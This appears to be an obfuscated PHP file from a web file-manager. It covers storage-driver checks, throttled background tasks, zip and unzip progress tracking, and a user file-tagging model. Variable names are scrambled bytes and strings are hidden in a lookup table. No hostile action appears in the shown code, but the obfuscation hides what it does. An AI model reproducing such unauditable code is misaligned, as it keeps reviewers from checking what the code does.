$—í„Ó…ƒ[12], strtolower($”Õ ¼ãŞ->getType())); if ($Ş‚í¶À‰ == $—í„Ó…ƒ[835] || $Ş‚í¶À‰ == $—í„Ó…ƒ[1412] || $Ş‚í¶À‰ == $—í„Ó…ƒ[1413]) { $”Õ ¼ãŞ = self::defaultDriverInit(); } else { if ($Ş‚í¶À‰ == $—í„Ó…ƒ[1296] || $Ş‚í¶À‰ == $—í„Ó…ƒ[1414]) { $”Õ ¼ãŞ = IO::init($”Õ ¼ãŞ->pathParse[$—í„Ó…ƒ[1239]]); } } $ÅÁ¥·íÜ = $”Õ ¼ãŞ->path; $Ş‚í¶À‰ = str_replace($—í„Ó…ƒ[1411], $—í„Ó…ƒ[12], strtolower($”Õ ¼ãŞ->getType())); if ($Ş‚í¶À‰ == $—í„Ó…ƒ[109]) { return array($—í„Ó…ƒ[33] => $—í„Ó…ƒ[109], $—í„Ó…ƒ[1408] => $—í„Ó…ƒ[12], $—í„Ó…ƒ[87] => $ÅÁ¥·íÜ, $—í„Ó…ƒ[98] => $”Õ ¼ãŞ); } return array($—í„Ó…ƒ[33] => $—í„Ó…ƒ[956], $—í„Ó…ƒ[1408] => $”Õ ¼ãŞ->pathDriver, $—í„Ó…ƒ[87] => $ÅÁ¥·íÜ, $—í„Ó…ƒ[98] => $”Õ ¼ãŞ); } public static function pathDriverType($ö¶¥”íé) { return $ö¶¥”íé ? self::driverType(IO::init($ö¶¥”íé)) : !1; } public static function pathDriverLocal($¶ıØ‘§Û) { $Õ³ßîû³ =& $_SERVER[¶Ô„œ…¯]; $­ÓŸ€˜ñ = $¶ıØ‘§Û ? self::driverType(IO::init($¶ıØ‘§Û)) : !1; return strtolower($­ÓŸ€˜ñ[$Õ³ßîû³[33]]) == $Õ³ßîû³[109] ? !0 : !1; } public static function allowCover($•ûÏÜŠª, $¾“èÆà® = true) { $êçüÅ÷ =& $_SERVER[¶Ô„œ…¯]; if (is_string($•ûÏÜŠª)) { $•ûÏÜŠª = IO::info($•ûÏÜŠª); } if (!$•ûÏÜŠª || $•ûÏÜŠª[$êçüÅ÷[33]] == $êçüÅ÷[78] || $•ûÏÜŠª[$êçüÅ÷[79]] <= 100) { return !1; } if (isset($•ûÏÜŠª[$êçüÅ÷[1415]]) || !$•ûÏÜŠª[$êçüÅ÷[87]]) { return !1; } if (isset($•ûÏÜŠª[$êçüÅ÷[234]]) && !$•ûÏÜŠª[$êçüÅ÷[234]]) { return !1; } static $ùû«ıİ¨ = false; if (!$ùû«ıİ¨ || !$¾“èÆà®) { $ó§ôú™¯ = self::driverType(IO::init($•ûÏÜŠª[$êçüÅ÷[87]])); $”Ñ«¿ÖÓ = $ó§ôú™¯[$êçüÅ÷[98]]; $ùû«ıİ¨ = $êçüÅ÷[196]; if ($ó§ôú™¯[$êçüÅ÷[33]] == $êçüÅ÷[109]) { $ùû«ıİ¨ = $êçüÅ÷[1416]; } if ($ó§ôú™¯[$êçüÅ÷[98]] && is_array($ó§ôú™¯[$êçüÅ÷[98]]->config)) { $­ñŒ–© = $ó§ôú™¯[$êçüÅ÷[98]]->config; if (isset($­ñŒ–©[$êçüÅ÷[1417]]) && $­ñŒ–©[$êçüÅ÷[1417]]) { $ùû«ıİ¨ = $êçüÅ÷[1416]; } } $åÃ–µº = KodIO::defaultDriver(); if (strtolower($åÃ–µº[$êçüÅ÷[98]]) == $êçüÅ÷[109] && is_array($åÃ–µº[$êçüÅ÷[6]])) { $ÙûÀºïÈ = $åÃ–µº[$êçüÅ÷[6]][$êçüÅ÷[1269]]; if (substr($ÙûÀºïÈ, 0, 2) == $êçüÅ÷[1418]) { $ÙûÀºïÈ = str_replace($êçüÅ÷[1418], BASIC_PATH, $ÙûÀºïÈ); } $ÙûÀºïÈ = str_replace($êçüÅ÷[256], $êçüÅ÷[8], $ÙûÀºïÈ); if (substr($•ûÏÜŠª[$êçüÅ÷[87]], 0, strlen($ÙûÀºïÈ)) == $ÙûÀºïÈ) { $ùû«ıİ¨ = $êçüÅ÷[196]; } } } return $ùû«ıİ¨ == $êçüÅ÷[1416] ? !0 : !1; } } goto f‰«®Œ™™Õ; Aò‰ÉßËó§: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($›–¾ÂÄ, $ÆÑ™ÚÏ» = 5.0) { if (!$›–¾ÂÄ) { return; } $êØüÍñ† = Cache::get($›–¾ÂÄ); if (!$êØüÍñ† || timeFloat() - floatVal($êØüÍñ†) >= $ÆÑ™ÚÏ») { Cache::set($›–¾ÂÄ, timeFloat(), $ÆÑ™ÚÏ» * 10); return !0; } return !1; } public static function timeLimitCall($ÏªÒ³“, $©ŒÖºëé, $Œ‹•ìšÓ, $¸•¿Ğê’ = 5.0) { $Í…š¥Ñ„ =& $_SERVER[¶Ô„œ…¯]; if (!$ÏªÒ³“ || !$©ŒÖºëé) { return; } self::$asyncAdd = !0; $ª¢«™êç = $Í…š¥Ñ„[1887]; $ÕÍ¯ñÇ¹ = Cache::get($ª¢«™êç, !0); $õ˜Ê¯½Á = array($Í…š¥Ñ„[1888] => timeFloat(), $Í…š¥Ñ„[1889] => timeFloat(), $Í…š¥Ñ„[343] => $©ŒÖºëé, $Í…š¥Ñ„[1879] => $Œ‹•ìšÓ, $Í…š¥Ñ„[206] => $¸•¿Ğê’); if (is_array($ÕÍ¯ñÇ¹[$ÏªÒ³“])) { $õ˜Ê¯½Á[$Í…š¥Ñ„[1889]] = $ÕÍ¯ñÇ¹[$ÏªÒ³“][$Í…š¥Ñ„[1889]]; } if (is_array($ÕÍ¯ñÇ¹[$ÏªÒ³“])) { if (timeFloat() - $ÕÍ¯ñÇ¹[$ÏªÒ³“][$Í…š¥Ñ„[1888]] < $õ˜Ê¯½Á[$Í…š¥Ñ„[206]] * 0.3) { return; } $õ˜Ê¯½Á[$Í…š¥Ñ„[1889]] = $ÕÍ¯ñÇ¹[$ÏªÒ³“][$Í…š¥Ñ„[1889]]; } $ÕÍ¯ñÇ¹[$ÏªÒ³“] = $õ˜Ê¯½Á; Cache::set($ª¢«™êç, $ÕÍ¯ñÇ¹, 60); Cache::removeMemory($ª¢«™êç); write_log($Í…š¥Ñ„[1890] . $ÏªÒ³“ . $Í…š¥Ñ„[74] . $©ŒÖºëé, $Í…š¥Ñ„[197]); } public static function timeLimitCallLoop() { $ç½ş’ãÈ =& $_SERVER[¶Ô„œ…¯]; $ô«›Éšë = array($ç½ş’ãÈ[1891]); $ï§µÖš¸ = in_array(strtolower(ACTION), $ô«›Éšë); if (!$ï§µÖš¸ && !self::$asyncAdd) { return; } $÷Ì§¡ë = $ç½ş’ãÈ[1887]; $ï³¾²èÌ = Cache::get($÷Ì§¡ë, !0); if (!$ï³¾²èÌ || count($ï³¾²èÌ) <= 0) { return; } $¬İ»ØÚä = !1; $×ÂñÔ§ = timeFloat(); $•ß÷¿İ = array(); foreach ($ï³¾²èÌ as $µ¯³‡”Ù => $‘Ò¦Å€Ï) { if ($×ÂñÔ§ - $‘Ò¦Å€Ï[$ç½ş’ãÈ[1889]] > $‘Ò¦Å€Ï[$ç½ş’ãÈ[206]]) { $¬İ»ØÚä = !0; try { Hook::apply($‘Ò¦Å€Ï[$ç½ş’ãÈ[343]], $‘Ò¦Å€Ï[$ç½ş’ãÈ[1879]]); write_log($ç½ş’ãÈ[1892] . $µ¯³‡”Ù . $ç½ş’ãÈ[74] . $‘Ò¦Å€Ï[$ç½ş’ãÈ[343]] . $ç½ş’ãÈ[1893] . ACTION, $ç½ş’ãÈ[197]); } catch (Exception $°—Éå«“) { } continue; } $•ß÷¿İ[$µ¯³‡”Ù] = $‘Ò¦Å€Ï; } if (!$¬İ»ØÚä) { return; } if (!$•ß÷¿İ) { return Cache::remove($÷Ì§¡ë); } Cache::set($÷Ì§¡ë, $•ß÷¿İ, 60); Cache::removeMemory($÷Ì§¡ë); } public static function finished($Åœ„“®Ø, $¨Œ¿Šõ«) { $šçÀßâñ =& $_SERVER[¶Ô„œ…¯]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($šçÀßâñ[343] => $Åœ„“®Ø, $šçÀßâñ[1879] => $¨Œ¿Šõ«); } private static function finishedRun() { $ÖØ…Ğ‰• =& $_SERVER[¶Ô„œ…¯]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $®ÄáÏş) { try { Hook::apply($®ÄáÏş[$ÖØ…Ğ‰•[343]], $®ÄáÏş[$ÖØ…Ğ‰•[1879]]); } catch (Exception $Ä™û¢ˆ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $±ÈˆÀÒ´ =& $_SERVER[¶Ô„œ…¯]; parent::startAfter(); Hook::bind($±ÈˆÀÒ´[1894], array($this, $±ÈˆÀÒ´[1895])); Hook::bind($±ÈˆÀÒ´[1285], array($this, $±ÈˆÀÒ´[1896])); Hook::bind($±ÈˆÀÒ´[1897], array($this, $±ÈˆÀÒ´[1898])); $ÇõãÁ„ò =& $this->task; $ÇõãÁ„ò[$±ÈˆÀÒ´[1899]] = $±ÈˆÀÒ´[1286]; if (!$ÇõãÁ„ò[$±ÈˆÀÒ´[1666]]) { $ÇõãÁ„ò[$±ÈˆÀÒ´[1666]] = LNG($±ÈˆÀÒ´[1900]); } } protected function endAfter() { $³¹ä·ÄÍ =& $_SERVER[¶Ô„œ…¯]; parent::endAfter(); Hook::unbind($³¹ä·ÄÍ[1894], array($this, $³¹ä·ÄÍ[1895])); Hook::unbind($³¹ä·ÄÍ[1285], array($this, $³¹ä·ÄÍ[1896])); Hook::unbind($³¹ä·ÄÍ[1897], array($this, $³¹ä·ÄÍ[1898])); } public function updateAfter() { $…À«’éî =& $_SERVER[¶Ô„œ…¯]; $ı—ş‹Öâ =& $this->task; if (!$ı—ş‹Öâ[$…À«’éî[1147]] || !$ı—ş‹Öâ[$…À«’éî[841]]) { if ($ı—ş‹Öâ[$…À«’éî[1899]] != $…À«’éî[390]) { return; } } if ($ı—ş‹Öâ[$…À«’éî[1899]] == $…À«’éî[1286]) { $Î¸ØËçé = 0; if ($ı—ş‹Öâ[$…À«’éî[1834]]) { $Î¸ØËçé = $ı—ş‹Öâ[$…À«’éî[1835]] / $ı—ş‹Öâ[$…À«’éî[1834]]; } $ı—ş‹Öâ[$…À«’éî[1782]] = $Î¸ØËçé * 0.3; } else { if ($ı—ş‹Öâ[$…À«’éî[1899]] == $…À«’éî[390]) { $Î¸ØËçé = $ı—ş‹Öâ[$…À«’éî[1781]] / $ı—ş‹Öâ[$…À«’éî[1147]]; $ı—ş‹Öâ[$…À«’éî[1782]] = 0.3 + $Î¸ØËçé * 0.4; } else { if ($ı—ş‹Öâ[$…À«’éî[1899]] == $…À«’éî[110]) { $ãšê¼Ôš = 0; if ($ı—ş‹Öâ[$…À«’éî[1836]] == $…À«’éî[110]) { $ãšê¼Ôš = $ı—ş‹Öâ[$…À«’éî[1835]]; } $Î¸ØËçé = ($ı—ş‹Öâ[$…À«’éî[1839]] + $ãšê¼Ôš) / $ı—ş‹Öâ[$…À«’éî[841]]; $ı—ş‹Öâ[$…À«’éî[1782]] = 0.3 + 0.4 + $Î¸ØËçé * 0.3; } } } if ($ı—ş‹Öâ[$…À«’éî[1782]] > 0) { $ ÏÊ³’ì = timeFloat() - $ı—ş‹Öâ[$…À«’éî[1784]] - $ı—ş‹Öâ[$…À«’éî[1787]]; $ı—ş‹Öâ[$…À«’éî[1788]] = $ ÏÊ³’ì * (1 - $ı—ş‹Öâ[$…À«’éî[1782]]) / $ı—ş‹Öâ[$…À«’éî[1782]]; } } public function addFile($Èê›ÓÏ¡) { $¾Ä¹à =& $_SERVER[¶Ô„œ…¯]; $Üúâ‘§– =& $this->task; $Ë”•óÅÉ = IO::info($Èê›ÓÏ¡); $Üúâ‘§–[$¾Ä¹à[1832]] = $Ë”•óÅÉ[$¾Ä¹à[32]]; $Üúâ‘§–[$¾Ä¹à[1834]] = $Ë”•óÅÉ[$¾Ä¹à[79]]; $Üúâ‘§–[$¾Ä¹à[1835]] = 0; $Üúâ‘§–[$¾Ä¹à[1149]] = $¾Ä¹à[1855]; $Üúâ‘§–[$¾Ä¹à[1836]] = $¾Ä¹à[1286]; $Üúâ‘§–[$¾Ä¹à[841]] = $Ë”•óÅÉ[$¾Ä¹à[79]]; $Üúâ‘§–[$¾Ä¹à[1147]] = 1; $¬¬Ú¹ñ = 0; $Üúâ‘§–[$¾Ä¹à[1843]] = array($¾Ä¹à[1844] => $¬¬Ú¹ñ + 1, $¾Ä¹à[496] => $Ë”•óÅÉ[$¾Ä¹à[32]], $¾Ä¹à[87] => $Ë”•óÅÉ[$¾Ä¹à[87]], $¾Ä¹à[584] => $Ë”•óÅÉ[$¾Ä¹à[584]] ? $Ë”•óÅÉ[$¾Ä¹à[584]] : $Ë”•óÅÉ[$¾Ä¹à[87]]); $this->update(); } public function zipEvent($¥–¥ÊŸ, $‰¬°°èè, $şÓ¼ •Ã, $’§¨Ş¿‰) { $°‹«À…£ =& $_SERVER[¶Ô„œ…¯]; $ä½Äà‰  =& $this->task; $ä½Äà‰ [$°‹«À…£[1832]] = get_path_this($‰¬°°èè); $ä½Äà‰ [$°‹«À…£[1834]] = $’§¨Ş¿‰; $ä½Äà‰ [$°‹«À…£[1835]] = $şÓ¼ •Ã; $ä½Äà‰ [$°‹«À…£[1149]] = $¥–¥ÊŸ == $°‹«À…£[1901] ? $°‹«À…£[1902] : $°‹«À…£[1903]; $ä½Äà‰ [$°‹«À…£[1836]] = $°‹«À…£[12]; $ä½Äà‰ [$°‹«À…£[841]] = $’§¨Ş¿‰; $ä½Äà‰ [$°‹«À…£[1899]] = $°‹«À…£[390]; $this->update(); } public function unzipAfter($ª“¿çùı) { $Å óŞ©¬ =& $_SERVER[¶Ô„œ…¯]; $ùÜÖæš´ =& $this->task; $ùÜÖæš´[$Å óŞ©¬[1899]] = $Å óŞ©¬[110]; $öÍ’Õı¾ = IO::infoWithChildren($ª“¿çùı); $‹¢ô‘¢‡ = 0; $ùÜÖæš´[$Å óŞ©¬[1843]] = array($Å óŞ©¬[1844] => $‹¢ô‘¢‡ + 1, $Å óŞ©¬[496] => $öÍ’Õı¾[$Å óŞ©¬[32]], $Å óŞ©¬[87] => $öÍ’Õı¾[$Å óŞ©¬[87]], $Å óŞ©¬[584] => $öÍ’Õı¾[$Å óŞ©¬[584]] ? $öÍ’Õı¾[$Å óŞ©¬[584]] : $öÍ’Õı¾[$Å óŞ©¬[87]]); if ($öÍ’Õı¾[$Å óŞ©¬[33]] == $Å óŞ©¬[232]) { $ùÜÖæš´[$Å óŞ©¬[1147]] = 1; } else { $ùÜÖæš´[$Å óŞ©¬[1147]] = $öÍ’Õı¾[$Å óŞ©¬[82]][$Å óŞ©¬[80]]; } $ùÜÖæš´[$Å óŞ©¬[1149]] = $Å óŞ©¬[12]; $ùÜÖæš´[$Å óŞ©¬[1836]] = 0; $ùÜÖæš´[$Å óŞ©¬[1781]] = 0; $ùÜÖæš´[$Å óŞ©¬[1834]] = 0; $ùÜÖæš´[$Å óŞ©¬[1835]] = 0; $ùÜÖæš´[$Å óŞ©¬[1832]] = $Å óŞ©¬[12]; $ùÜÖæš´[$Å óŞ©¬[1839]] = 0; $ùÜÖæš´[$Å óŞ©¬[841]] = $öÍ’Õı¾[$Å óŞ©¬[79]]; $this->update(); self::log($Å óŞ©¬[1904] . json_encode(array($ùÜÖæš´, $öÍ’Õı¾))); } public function nameParse($º¤Æ¬æİ) { $İëå¶ï‚ =& $_SERVER[¶Ô„œ…¯]; $…¾§‹™Ê =& $this->task; if ($…¾§‹™Ê[$İëå¶ï‚[1899]] == $İëå¶ï‚[1286]) { $…¾§‹™Ê[$İëå¶ï‚[1899]] = $İëå¶ï‚[390]; $…¾§‹™Ê[$İëå¶ï‚[1839]] = 0; $…¾§‹™Ê[$İëå¶ï‚[841]] = 0; } $„ÇÙê´¹ = get_path_this($º¤Æ¬æİ); if (strstr($„ÇÙê´¹, $İëå¶ï‚[10])) { $…¾§‹™Ê[$İëå¶ï‚[1781]] += 1; $…¾§‹™Ê[$İëå¶ï‚[1147]] += 1; } $…¾§‹™Ê[$İëå¶ï‚[1832]] = $º¤Æ¬æİ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $§ä…¸—¥ =& $_SERVER[¶Ô„œ…¯]; parent::startAfter(); Hook::bind($§ä…¸—¥[1905], array($this, $§ä…¸—¥[1895])); Hook::bind($§ä…¸—¥[1897], array($this, $§ä…¸—¥[1898])); $îíôˆĞÛ =& $this->task; $îíôˆĞÛ[$§ä…¸—¥[1899]] = $§ä…¸—¥[1286]; if (!$îíôˆĞÛ[$§ä…¸—¥[1666]]) { $îíôˆĞÛ[$§ä…¸—¥[1666]] = LNG($§ä…¸—¥[1906]); } } protected function endAfter() { $´Ï›°²³ =& $_SERVER[¶Ô„œ…¯]; parent::endAfter(); Hook::unbind($´Ï›°²³[1905], array($this, $´Ï›°²³[1895])); Hook::unbind($´Ï›°²³[1897], array($this, $´Ï›°²³[1898])); } public function updateAfter() { $­Î—«‡÷ =& $_SERVER[¶Ô„œ…¯]; $Â¿Ëéè‚ =& $this->task; if (!$Â¿Ëéè‚[$­Î—«‡÷[1147]] || !$Â¿Ëéè‚[$­Î—«‡÷[841]]) { return; } if ($Â¿Ëéè‚[$­Î—«‡÷[1899]] == $­Î—«‡÷[1286]) { $±Åßı¬Ñ = $Â¿Ëéè‚[$­Î—«‡÷[1835]]; if ($Â¿Ëéè‚[$­Î—«‡÷[1836]] != $­Î—«‡÷[1286]) { $±Åßı¬Ñ = 0; } $Ú‚­Ë†Ó = ($Â¿Ëéè‚[$­Î—«‡÷[1839]] + $±Åßı¬Ñ) / $Â¿Ëéè‚[$­Î—«‡÷[841]]; $Â¿Ëéè‚[$­Î—«‡÷[1782]] = $Ú‚­Ë†Ó * 0.3; } else { if ($Â¿Ëéè‚[$­Î—«‡÷[1899]] == $­Î—«‡÷[390]) { $Ú‚­Ë†Ó = $Â¿Ëéè‚[$­Î—«‡÷[1781]] / $Â¿Ëéè‚[$­Î—«‡÷[1147]]; $Â¿Ëéè‚[$­Î—«‡÷[1782]] = 0.3 + $Ú‚­Ë†Ó * 0.5; } else { if ($Â¿Ëéè‚[$­Î—«‡÷[1899]] == $­Î—«‡÷[110]) { $Ú‚­Ë†Ó = 0; if ($Â¿Ëéè‚[$­Î—«‡÷[1834]]) { $Ú‚­Ë†Ó = $Â¿Ëéè‚[$­Î—«‡÷[1835]] / $Â¿Ëéè‚[$­Î—«‡÷[1834]]; } $Â¿Ëéè‚[$­Î—«‡÷[1782]] = 0.3 + 0.5 + $Ú‚­Ë†Ó * 0.2; } } } if ($Â¿Ëéè‚[$­Î—«‡÷[1782]] > 0) { $»¥ÙõÍ’ = timeFloat() - $Â¿Ëéè‚[$­Î—«‡÷[1784]] - $Â¿Ëéè‚[$­Î—«‡÷[1787]]; $Â¿Ëéè‚[$­Î—«‡÷[1788]] = $»¥ÙõÍ’ * (1 - $Â¿Ëéè‚[$­Î—«‡÷[1782]]) / $Â¿Ëéè‚[$­Î—«‡÷[1782]]; } } public function copyFileStart($‹ÍŸ„ø’, $Ò¶â˜ÑÓ, $¼ú¤Ê´, $ÁåÄî¢, $ã·óŒ²ˆ, $Ú·Ô¤Òø) { $üêÅÚ„Õ =& $_SERVER[¶Ô„œ…¯]; parent::copyFileStart($‹ÍŸ„ø’, $Ò¶â˜ÑÓ, $¼ú¤Ê´, $ÁåÄî¢, $ã·óŒ²ˆ, $Ú·Ô¤Òø); $Õ»Ëç¤ê =& $this->task; if ($Õ»Ëç¤ê[$üêÅÚ„Õ[1899]] == $üêÅÚ„Õ[390]) { $Õ»Ëç¤ê[$üêÅÚ„Õ[1899]] = $üêÅÚ„Õ[110]; } $this->update(); } public function copyFileEnd($¾æÂ‘é, $ö ïÀ¡û, $ÊÀœ¯ï, $¡óªÏœ†, $ÂøšıÛ, $¯Şìª†) { $¨ğŒª¶» =& $_SERVER[¶Ô„œ…¯]; $»íÆÕÃÊ =& $this->task; $»íÆÕÃÊ[$¨ğŒª¶»[1835]] = $»íÆÕÃÊ[$¨ğŒª¶»[1834]]; $»íÆÕÃÊ[$¨ğŒª¶»[1839]] += $»íÆÕÃÊ[$¨ğŒª¶»[1834]]; $»íÆÕÃÊ[$¨ğŒª¶»[1836]] = $¨ğŒª¶»[12]; $this->update(); } public function zipEvent($½‡…ˆ­Ô, $¼ş•ƒ¡, $õç÷çÛ„, $åğãöÉ) { $ş‚†©× =& $_SERVER[¶Ô„œ…¯]; $å”‡“ü¼ =& $this->task; $å”‡“ü¼[$ş‚†©×[1832]] = get_path_this($¼ş•ƒ¡); $å”‡“ü¼[$ş‚†©×[1834]] = $åğãöÉ; $å”‡“ü¼[$ş‚†©×[1835]] = $õç÷çÛ„; $å”‡“ü¼[$ş‚†©×[1149]] = $½‡…ˆ­Ô == $ş‚†©×[1907] ? $ş‚†©×[1902] : $ş‚†©×[1903]; $å”‡“ü¼[$ş‚†©×[1836]] = $ş‚†©×[12]; $å”‡“ü¼[$ş‚†©×[841]] = $åğãöÉ; $å”‡“ü¼[$ş‚†©×[1899]] = $ş‚†©×[390]; $this->update(); } public function nameParse($»Øóù…Ä) { $µĞ¿±¾« =& $_SERVER[¶Ô„œ…¯]; $«íãä·ë =& $this->task; if ($«íãä·ë[$µĞ¿±¾«[1781]] < $«íãä·ë[$µĞ¿±¾«[1147]]) { $’–Ö¯×¬ = get_path_this($»Øóù…Ä); if (strstr($’–Ö¯×¬, $µĞ¿±¾«[10])) { $«íãä·ë[$µĞ¿±¾«[1781]] += 1; } } if ($«íãä·ë[$µĞ¿±¾«[1899]] == $µĞ¿±¾«[1286]) { $«íãä·ë[$µĞ¿±¾«[1899]] = $µĞ¿±¾«[390]; } $«íãä·ë[$µĞ¿±¾«[1832]] = $»Øóù…Ä; $this->update(); } } goto FŒ›º¡†ä; D½öæïòóÇ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\162\137\x66\x61\x76"; protected function cacheFunctionAlias($ì£ÉõØš) { $†µàùú =& $_SERVER[¶Ô„œ…¯]; return array($†µàùú[2095] => array($†µàùú[2519] . USER_ID, $†µàùú[2096])); } protected function listData() { $¤ëöµ­ =& $_SERVER[¶Ô„œ…¯]; $Û¸ØÚİÁ = array($¤ëöµ­[1771] => USER_ID, $¤ëöµ­[559] => array($¤ëöµ­[2099], 0)); $¤úşäš = $¤ëöµ­[2520]; $¸øôıÌ = $this->field($¤úşäš)->where($Û¸ØÚİÁ)->order($¤ëöµ­[2102])->select(); return $¸øôıÌ ? $¸øôıÌ : array(); } protected function addToTag($±äşíª, $°¤ Ñ§›) { $Èäï¥’ =& $_SERVER[¶Ô„œ…¯]; if (!Model($Èäï¥’[2248])->listData($°¤ Ñ§›)) { return !1; } if (is_numeric($±äşíª)) { $™ˆÃÖï„ = Model($Èäï¥’[903])->pathInfo($±äşíª); if (!$™ˆÃÖï„) { return !1; } } else { $™ˆÃÖï„ = IO::infoSimple($±äşíª); if (!$™ˆÃÖï„) { return !1; } $«Ê³Ğ‰ = $™ˆÃÖï„[$Èäï¥’[32]]; $Á£Å×Ü = $™ˆÃÖï„[$Èäï¥’[33]]; if (isset($™ˆÃÖï„[$Èäï¥’[487]])) { $Á£Å×Ü = $™ˆÃÖï„[$Èäï¥’[487]] == $Èäï¥’[91] ? $Èäï¥’[78] : $Èäï¥’[232]; } } $€÷ŠÊ¹ = array($Èäï¥’[1771] => USER_ID, $Èäï¥’[559] => $°¤ Ñ§›, $Èäï¥’[497] => $±äşíª, $Èäï¥’[498] => $Á£Å×Ü ? $Á£Å×Ü : $Èäï¥’[492], $Èäï¥’[496] => $«Ê³Ğ‰ ? $«Ê³Ğ‰ : $Èäï¥’[12], $Èäï¥’[1984] => 0); if ($this->where($€÷ŠÊ¹)->find()) { return !1; } return $this->add($€÷ŠÊ¹); } protected function removeFromTag($ßı½ÑŞó, $”ôÕ°) { $éÖªÏŞÚ =& $_SERVER[¶Ô„œ…¯]; if (!Model($éÖªÏŞÚ[2248])->listData($”ôÕ°)) { return !1; } if (is_array($ßı½ÑŞó)) { $ßı½ÑŞó = array($éÖªÏŞÚ[7], $ßı½ÑŞó); } $­ç¡ö™ = array($éÖªÏŞÚ[1771] => USER_ID, $éÖªÏŞÚ[559] => $”ôÕ°, $éÖªÏŞÚ[497] => $ßı½ÑŞó); return $this->where($­ç¡ö™)->delete(); } protected function removeByTag($¬¤Ê„¯à) { $‰ÙÁÌĞ’ =& $_SERVER[¶Ô„œ…¯]; if (!$¬¤Ê„¯à) { return !1; } $½Õ©Úß“ = array($‰ÙÁÌĞ’[1771] => USER_ID, $‰ÙÁÌĞ’[559] => $¬¤Ê„¯à); return $this->where($½Õ©Úß“)->delete(); } protected function removeBySource($ôˆˆÒª¾) { $Œ¥ÄØÌ­ =& $_SERVER[¶Ô„œ…¯]; if (is_array($ôˆˆÒª¾)) { $ôˆˆÒª¾ = array($Œ¥ÄØÌ­[7], $ôˆˆÒª¾); } $‚ª­« = array($Œ¥ÄØÌ­[1771] => USER_ID, $Œ¥ÄØÌ­[559] => array($Œ¥ÄØÌ­[1098], 0), $Œ¥ÄØÌ­[497] => $ôˆˆÒª¾); return $this->where($‚ª­«)->delete(); } }